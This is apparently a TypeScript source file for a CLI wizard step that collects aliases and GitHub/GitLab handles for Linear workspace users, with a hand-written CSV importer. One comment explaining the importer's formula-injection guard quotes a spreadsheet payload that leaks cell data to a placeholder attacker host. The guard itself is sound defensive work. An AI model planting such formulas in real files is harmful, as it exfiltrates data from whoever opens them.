/**
 * Step 3 of the wizard: member aliases.
 *
 * For each Linear user in the workspace, the user can add short aliases,
 * GitHub handles, and GitLab handles used for resolution. Skip-by-default
 * (most users skip this and only fill in the people they @-mention often).
 *
 * Idempotent: re-running shows the current aliases per user and offers a
 * 4-way menu (keep / edit / append / clear) plus quit. Progress is persisted
 * so an interrupted walk can be resumed via `el-linear init aliases`.
 */

import fs from "node:fs/promises";
import { confirm, input, select } from "@inquirer/prompts";
import { GraphQLService } from "../../utils/graphql-service.js";
import {
	type AliasesProgress,
	clearAliasesProgress,
	parseCsvList,
	readAliasesProgress,
	type WizardConfig,
	writeAliasesProgress,
} from "./shared.js";

const USERS_QUERY = /* GraphQL */ `
  query InitUsers($first: Int!, $after: String) {
    users(first: $first, after: $after, includeDisabled: false) {
      pageInfo { endCursor hasNextPage }
      nodes { id name email displayName active }
    }
  }
`;

interface UsersResponse {
	users: {
		pageInfo: { endCursor: string | null; hasNextPage: boolean };
		nodes: Array<{
			id: string;
			name: string;
			email: string | null;
			displayName: string | null;
			active: boolean;
		}>;
	};
}

export interface User {
	id: string;
	name: string;
	email: string | null;
	displayName: string;
}

export async function fetchAllUsers(token: string): Promise<User[]> {
	const service = new GraphQLService({ apiKey: token });
	const out: User[] = [];
	let after: string | undefined;
	for (;;) {
		const data = await service.rawRequest<UsersResponse>(USERS_QUERY, {
			first: 100,
			after,
		});
		for (const u of data.users.nodes) {
			if (!u.active) continue;
			out.push({
				id: u.id,
				name: u.name,
				email: u.email,
				displayName: u.displayName ?? u.name,
			});
		}
		if (!data.users.pageInfo.hasNextPage || !data.users.pageInfo.endCursor)
			break;
		after = data.users.pageInfo.endCursor;
	}
	return out;
}

/**
 * Find groups of users sharing the same display name. The current alias
 * config keys aliases by display name, so colliding users would silently
 * overwrite each other's entries. Detection is exported so the wizard can
 * warn + skip those users; a follow-up (1.3.0) will migrate the on-disk
 * schema to UUID-keyed maps.
 */
export function findDisplayNameCollisions(users: User[]): Map<string, User[]> {
	const byName = new Map<string, User[]>();
	for (const u of users) {
		const list = byName.get(u.displayName);
		if (list) list.push(u);
		else byName.set(u.displayName, [u]);
	}
	const collisions = new Map<string, User[]>();
	for (const [name, group] of byName) {
		if (group.length > 1) collisions.set(name, group);
	}
	return collisions;
}

/** Apply a HandleAction to a `{ handle: fullName }` map for one user. */
function applyHandleAction(
	handlesMap: Record<string, string>,
	fullName: string,
	action: HandleAction,
): void {
	if (action.kind === "keep") return;
	const currentKeys = Object.entries(handlesMap)
		.filter(([_, v]) => v === fullName)
		.map(([k]) => k);
	for (const k of currentKeys) delete handlesMap[k];
	if (action.kind === "set" && action.value.trim()) {
		handlesMap[action.value.trim()] = fullName;
	}
}

/**
 * Merge new alias entries into existing config without dropping unrelated
 * fields. Pure function — no I/O. Exported for testing.
 */
export function mergeAliasesIntoConfig(
	existing: WizardConfig,
	updates: Map<string, AliasUpdate>,
): WizardConfig {
	const next: WizardConfig = JSON.parse(JSON.stringify(existing));
	next.members = next.members ?? {};
	next.members.aliases = next.members.aliases ?? {};
	next.members.fullNames = next.members.fullNames ?? {};
	next.members.handles = next.members.handles ?? {};
	next.members.uuids = next.members.uuids ?? {};
	next.members.handles.github = next.members.handles.github ?? {};
	next.members.handles.gitlab = next.members.handles.gitlab ?? {};

	for (const [userId, update] of updates) {
		const fullName = update.displayName;
		next.members.uuids[fullName] = userId;
		next.members.fullNames[userId] = fullName;

		// Aliases: replace this user's entries based on the update mode.
		// We track aliases as { aliasKey: fullName }, so removing means deleting
		// any keys whose value is this fullName.
		const currentAliasKeys = Object.entries(next.members.aliases)
			.filter(([_, v]) => v === fullName)
			.map(([k]) => k);

		if (update.mode === "clear") {
			for (const k of currentAliasKeys) delete next.members.aliases[k];
		} else if (update.mode === "edit") {
			for (const k of currentAliasKeys) delete next.members.aliases[k];
			for (const a of update.aliases) next.members.aliases[a] = fullName;
		} else if (update.mode === "append") {
			for (const a of update.aliases) next.members.aliases[a] = fullName;
		}
		// "keep" → no changes.

		// GitHub / GitLab handles use the same edit/append/clear semantics,
		// driven by the discriminated HandleAction per platform.
		for (const platform of HANDLE_PLATFORMS) {
			applyHandleAction(
				next.members.handles[platform] as Record<string, string>,
				fullName,
				update[platform],
			);
		}
	}
	return next;
}

/**
 * What to do with a single platform handle (github/gitlab/...) when applying
 * an AliasUpdate. Discriminated union; no sentinel strings.
 *
 * - keep:  no change (leave any existing handle for this user alone)
 * - clear: delete any existing handle for this user
 * - set:   replace any existing handle with the given value
 */
export type HandleAction =
	| { kind: "keep" }
	| { kind: "clear" }
	| { kind: "set"; value: string };

/** Set of supported platforms for member handle keys. */
export const HANDLE_PLATFORMS = ["github", "gitlab"] as const;
export type HandlePlatform = (typeof HANDLE_PLATFORMS)[number];

export interface AliasUpdate {
	displayName: string;
	mode: "keep" | "edit" | "append" | "clear";
	aliases: string[];
	github: HandleAction;
	gitlab: HandleAction;
}

function currentAliasesFor(config: WizardConfig, fullName: string): string[] {
	const aliases = config.members?.aliases ?? {};
	return Object.entries(aliases)
		.filter(([_, v]) => v === fullName)
		.map(([k]) => k);
}

function currentHandleFor(
	config: WizardConfig,
	platform: "github" | "gitlab",
	fullName: string,
): string | undefined {
	const handles = config.members?.handles?.[platform] ?? {};
	for (const [k, v] of Object.entries(handles)) {
		if (v === fullName) return k;
	}
	return undefined;
}

/**
 * Walk users one-by-one. Returns updates keyed by user UUID. Caller writes
 * them back via `mergeAliasesIntoConfig`. The CSV import path is a separate
 * entrypoint (`runAliasesImport`) — there's no `importCsv` option on this
 * function, since the index.ts handler picks one or the other.
 */
export async function runAliasesStep(
	token: string,
	existing: WizardConfig,
	options: {
		/** Skip the per-section "walk now?" prompt and force the walk. */
		force?: boolean;
	} = {},
): Promise<Map<string, AliasUpdate>> {
	const proceed = options.force
		? true
		: await confirm({
				message:
					"Walk through users now to add aliases? Most teams skip this and add aliases later " +
					"via `el-linear init aliases` for the people they @-mention often.",
				default: false,
			});
	if (!proceed) {
		console.log(
			"  Skipped — run `el-linear init aliases` to add or edit aliases later.",
		);
		return new Map();
	}

	const allUsers = await fetchAllUsers(token);
	if (allUsers.length === 0) {
		console.log("  No active users visible to this token.");
		return new Map();
	}

	// Skip users whose display name collides with another active user. The
	// current schema keys aliases by display name, so writing aliases for a
	// colliding user would corrupt the other user's entries. A schema migration
	// to UUID-keyed maps is queued for 1.3.0.
	const collisions = findDisplayNameCollisions(allUsers);
	const collidingIds = new Set<string>();
	if (collisions.size > 0) {
		console.log(
			`  ⚠ ${collisions.size} display name(s) are shared by multiple active users — skipping those to avoid alias corruption:`,
		);
		for (const [name, group] of collisions) {
			console.log(
				`    "${name}" — ${group.map((u) => u.email ?? u.id).join(", ")}`,
			);
			for (const u of group) collidingIds.add(u.id);
		}
		console.log(
			"    (Add aliases manually in ~/.config/el-linear/config.json for now; schema migration in 1.3.0.)",
		);
	}
	const users = allUsers.filter((u) => !collidingIds.has(u.id));
	if (users.length === 0) {
		console.log("  No safe-to-alias users remain after collision filter.");
		return new Map();
	}

	const startIdx = await resolveResumePoint(users);
	console.log(
		`  Walking ${users.length - startIdx}/${users.length} users. Type 'q' at any prompt to stop and save progress.`,
	);

	const updates = new Map<string, AliasUpdate>();
	let lastCompletedIdx = startIdx - 1;

	const saveProgress = async () => {
		if (lastCompletedIdx < 0) return;
		await writeAliasesProgress({
			lastCompletedUserId: users[lastCompletedIdx].id,
			totalUsers: users.length,
			savedAt: new Date().toISOString(),
		});
	};

	try {
		for (let i = startIdx; i < users.length; i++) {
			const u = users[i];
			const update = await promptForUser(i + 1, users.length, u, existing);
			if (update === "quit") {
				await saveProgress();
				console.log(
					`  Saved progress at ${lastCompletedIdx + 1}/${users.length}. Resume with \`el-linear init aliases\`.`,
				);
				return updates;
			}
			if (
				update.mode !== "keep" ||
				update.github.kind !== "keep" ||
				update.gitlab.kind !== "keep"
			) {
				updates.set(u.id, update);
			}
			lastCompletedIdx = i;
		}
		await clearAliasesProgress();
		console.log(`  ✓ Walked all ${users.length} users.`);
		return updates;
	} catch (err) {
		// Save what we have on unexpected error so the user can resume.
		if (lastCompletedIdx >= startIdx) await saveProgress();
		throw err;
	}
}

/**
 * Decide where to resume the user-walk. Looks up the saved
 * `lastCompletedUserId` in the freshly-fetched user list:
 *   - found      → resume at the next index after that user
 *   - not found  → the workspace changed (user removed/disabled). Start over.
 *   - no progress → start at 0
 *
 * Keying by UUID instead of index means a user being removed or added
 * between runs no longer silently misaligns the resume point onto the
 * wrong person.
 */
async function resolveResumePoint(users: User[]): Promise<number> {
	const progress: AliasesProgress | null = await readAliasesProgress();
	if (!progress?.lastCompletedUserId) return 0;
	const idx = users.findIndex((u) => u.id === progress.lastCompletedUserId);
	if (idx < 0) {
		console.log(
			"  Saved progress points at a user no longer in the workspace. Starting over.",
		);
		await clearAliasesProgress();
		return 0;
	}
	const resume = await confirm({
		message: `Resume from user ${idx + 2}/${users.length}? (saved ${progress.savedAt})`,
		default: true,
	});
	if (resume) return idx + 1;
	await clearAliasesProgress();
	return 0;
}

async function promptForUser(
	index: number,
	total: number,
	user: User,
	existing: WizardConfig,
): Promise<AliasUpdate | "quit"> {
	const fullName = user.displayName;
	const currentAliases = currentAliasesFor(existing, fullName);
	const currentGithub = currentHandleFor(existing, "github", fullName);
	const currentGitlab = currentHandleFor(existing, "gitlab", fullName);

	console.log(
		`\n  [${index}/${total}] ${fullName}${user.email ? ` <${user.email}>` : ""}`,
	);
	if (currentAliases.length > 0) {
		console.log(`    Current aliases: ${currentAliases.join(", ")}`);
	}
	if (currentGithub) {
		console.log(`    Current GitHub:  ${currentGithub}`);
	}
	if (currentGitlab) {
		console.log(`    Current GitLab:  ${currentGitlab}`);
	}

	const action = await select<"keep" | "edit" | "append" | "clear" | "quit">({
		message:
			currentAliases.length > 0 ? "Action:" : "Add aliases for this user?",
		choices: [
			{ name: "Keep as-is (skip this user)", value: "keep" },
			{
				name:
					currentAliases.length > 0 ? "Edit (replace aliases)" : "Add aliases",
				value: "edit",
			},
			...(currentAliases.length > 0
				? [
						{
							name: "Append (keep current + add more)",
							value: "append" as const,
						},
						{
							name: "Clear (remove all aliases for this user)",
							value: "clear" as const,
						},
					]
				: []),
			{ name: "Quit (save progress, exit walk)", value: "quit" },
		],
		default: "keep",
	});

	if (action === "quit") return "quit";
	if (action === "keep") {
		return {
			displayName: fullName,
			mode: "keep",
			aliases: [],
			github: { kind: "keep" },
			gitlab: { kind: "keep" },
		};
	}
	if (action === "clear") {
		return {
			displayName: fullName,
			mode: "clear",
			aliases: [],
			github: currentGithub ? { kind: "clear" } : { kind: "keep" },
			gitlab: currentGitlab ? { kind: "clear" } : { kind: "keep" },
		};
	}

	// edit / append: collect aliases + handles
	const aliasesRaw = await input({
		message: "Aliases (comma-separated, blank to skip):",
		default: action === "edit" ? currentAliases.join(", ") : "",
	});
	const githubRaw = await input({
		message: "GitHub handle (blank to skip):",
		default: currentGithub ?? "",
	});
	const gitlabRaw = await input({
		message: "GitLab handle (blank to skip):",
		default: currentGitlab ?? "",
	});

	return {
		displayName: fullName,
		mode: action,
		aliases: parseCsvList(aliasesRaw),
		github: handleActionFromInput(githubRaw, currentGithub),
		gitlab: handleActionFromInput(gitlabRaw, currentGitlab),
	};
}

/**
 * Translate the raw user input for a handle into a HandleAction:
 *   - input matches the existing value (or both empty) → keep
 *   - input is empty + existing was set → clear
 *   - input is non-empty + differs from existing → set
 */
function handleActionFromInput(
	rawInput: string,
	existing: string | undefined,
): HandleAction {
	const current = existing ?? "";
	if (rawInput === current) return { kind: "keep" };
	const trimmed = rawInput.trim();
	if (!trimmed) return { kind: "clear" };
	return { kind: "set", value: trimmed };
}

/**
 * Batch alias import from a CSV. Format:
 *   email,aliases,github,gitlab
 *   alice@example.com,"alice,ali",alice-gh,
 *   bob@example.com,"bob",,
 *
 * Lines starting with `#` are comments. Aliases column is comma-separated
 * inside the cell; if the cell contains commas it must be quoted.
 *
 * Resolves emails to Linear user UUIDs internally, so the result is keyed
 * by UUID and ready to pass to `mergeAliasesIntoConfig`. Rows whose email
 * doesn't match an active user are reported via the returned `skipped[]`
 * list (the caller decides whether to surface them).
 */
export interface AliasesImportResult {
	updates: Map<string, AliasUpdate>;
	skipped: string[];
}

export async function runAliasesImport(
	token: string,
	csvPath: string,
): Promise<AliasesImportResult> {
	const raw = await fs.readFile(csvPath, "utf8");
	const rows = parseCsv(raw);
	const users = await fetchAllUsers(token);
	const byEmail = new Map<string, User>();
	for (const u of users) {
		if (u.email) byEmail.set(u.email.toLowerCase(), u);
	}

	const updates = new Map<string, AliasUpdate>();
	const skipped: string[] = [];
	for (const row of rows) {
		const email = (row.email ?? "").trim().toLowerCase();
		if (!email) continue;
		const user = byEmail.get(email);
		if (!user) {
			skipped.push(email);
			continue;
		}
		updates.set(user.id, {
			displayName: user.displayName,
			mode: "edit",
			aliases: parseCsvList(row.aliases ?? ""),
			github: row.github?.trim()
				? { kind: "set", value: row.github.trim() }
				: { kind: "keep" },
			gitlab: row.gitlab?.trim()
				? { kind: "set", value: row.gitlab.trim() }
				: { kind: "keep" },
		});
	}
	return { updates, skipped };
}

interface CsvRow {
	email?: string;
	aliases?: string;
	github?: string;
	gitlab?: string;
}

/**
 * Single-pass character-state CSV parser. Handles RFC 4180 specifics that
 * a split-by-newline approach gets wrong:
 *   - Cells with embedded newlines (legal when quoted)
 *   - Escaped quotes (`""` inside a quoted cell)
 *   - CRLF line endings
 *   - `#` comment lines (el-linear extension; only at line start)
 *
 * Sanitizes against CSV-formula-injection at parse time: any cell starting
 * with `=`, `+`, `-`, `@`, `\t`, or `\r` is rejected. These would activate
 * formulas if the resulting config were ever round-tripped to a spreadsheet
 * (e.g. an alias of `=HYPERLINK("http://attacker/?leak="&A1)` would store
 * verbatim today and fire the moment someone opened the export in Excel).
 */
export function parseCsv(text: string): CsvRow[] {
	const records = parseCsvRecords(text);
	const cleaned = records.filter((cells) => {
		// Drop blank lines and `#`-prefixed comment lines.
		if (cells.length === 0) return false;
		if (cells.length === 1 && cells[0].trim() === "") return false;
		const first = cells[0];
		if (first.trim().startsWith("#")) return false;
		return true;
	});
	if (cleaned.length === 0) return [];
	const header = cleaned[0].map((h) => h.trim().toLowerCase());
	const rows: CsvRow[] = [];
	for (let i = 1; i < cleaned.length; i++) {
		const cells = cleaned[i];
		const row: CsvRow = {};
		for (let j = 0; j < header.length; j++) {
			const value = (cells[j] ?? "").trim();
			assertNoFormulaInjection(value);
			const k = header[j] as keyof CsvRow;
			row[k] = value;
		}
		rows.push(row);
	}
	return rows;
}

// `=+-@` are the OWASP-flagged formula-injection triggers in Excel/Google
// Sheets. Tab and CR are also mentioned in some guides, but our parser trims
// each cell before reaching this check, so leading whitespace is stripped
// regardless. Keep the list narrow to avoid false-positive rejections.
const FORMULA_PREFIXES = ["=", "+", "-", "@"] as const;

function assertNoFormulaInjection(cell: string): void {
	if (cell.length === 0) return;
	const first = cell[0];
	if (FORMULA_PREFIXES.includes(first as (typeof FORMULA_PREFIXES)[number])) {
		throw new Error(
			`CSV cell starts with "${first}" — refusing to import to prevent ` +
				`formula injection (cell: ${JSON.stringify(cell.slice(0, 40))}). ` +
				`Prefix with a space if the value is intentional.`,
		);
	}
}

/**
 * Tokenize a CSV document into records (each record is an array of cells).
 * Walks character-by-character through a four-state machine:
 *   - cellStart: about to read a cell. Decide quoted vs. unquoted.
 *   - unquoted:  reading an unquoted cell. , and newline terminate.
 *   - quoted:    inside a quoted cell. " is the only terminator.
 *   - quotedEnd: just saw a " inside a quoted cell — `""` escapes; otherwise
 *                the cell is closed and we expect a delimiter.
 */
function parseCsvRecords(text: string): string[][] {
	const records: string[][] = [];
	let row: string[] = [];
	let cell = "";
	type State = "cellStart" | "unquoted" | "quoted" | "quotedEnd";
	let state: State = "cellStart";

	const finishCell = () => {
		row.push(cell);
		cell = "";
		state = "cellStart";
	};
	const finishRow = () => {
		row.push(cell);
		cell = "";
		records.push(row);
		row = [];
		state = "cellStart";
	};

	for (let i = 0; i < text.length; i++) {
		const ch = text[i];
		if (state === "cellStart") {
			if (ch === '"') {
				state = "quoted";
				continue;
			}
			if (ch === ",") {
				finishCell();
				continue;
			}
			if (ch === "\n") {
				finishRow();
				continue;
			}
			if (ch === "\r") {
				if (text[i + 1] === "\n") i++;
				finishRow();
				continue;
			}
			cell += ch;
			state = "unquoted";
			continue;
		}
		if (state === "unquoted") {
			if (ch === ",") {
				finishCell();
				continue;
			}
			if (ch === "\n") {
				finishRow();
				continue;
			}
			if (ch === "\r") {
				if (text[i + 1] === "\n") i++;
				finishRow();
				continue;
			}
			cell += ch;
			continue;
		}
		if (state === "quoted") {
			if (ch === '"') {
				state = "quotedEnd";
				continue;
			}
			cell += ch;
			continue;
		}
		// quotedEnd
		if (ch === '"') {
			cell += '"';
			state = "quoted";
			continue;
		}
		if (ch === ",") {
			finishCell();
			continue;
		}
		if (ch === "\n") {
			finishRow();
			continue;
		}
		if (ch === "\r") {
			if (text[i + 1] === "\n") i++;
			finishRow();
			continue;
		}
		// Stray character after a closed quote — forgive and treat as unquoted.
		cell += ch;
		state = "unquoted";
	}
	// Trailing record (no terminating newline).
	if (cell.length > 0 || row.length > 0) {
		row.push(cell);
		records.push(row);
	}
	return records;
}
